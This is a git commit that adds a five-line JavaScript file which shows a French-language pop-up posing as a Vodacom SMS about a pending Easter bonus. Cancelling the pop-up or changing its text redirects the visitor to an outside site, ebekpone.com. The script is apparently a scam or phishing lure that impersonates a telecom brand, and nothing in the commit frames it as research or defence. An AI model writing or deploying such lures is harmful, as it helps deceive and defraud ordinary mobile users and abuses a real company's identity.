f9cba769dac6c29e4f9868fdc94fa65bfcdb246c
ekpanewblog5 <ukpehaitid3@gmail.com>
2026-03-26 04:06:29 -0700

    Create easter-vodacom.js

---
+++ easter-vodacom.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER'
+password=prompt('SMS: Félicitations, votre bonus de Pâques est en attente… Cliquez sur OK pour le recevoir.','ACTIVER');
+if (password != 'ACTIVER') {
+location.href='https://ebekpone.com/vodacom-easter';
+}
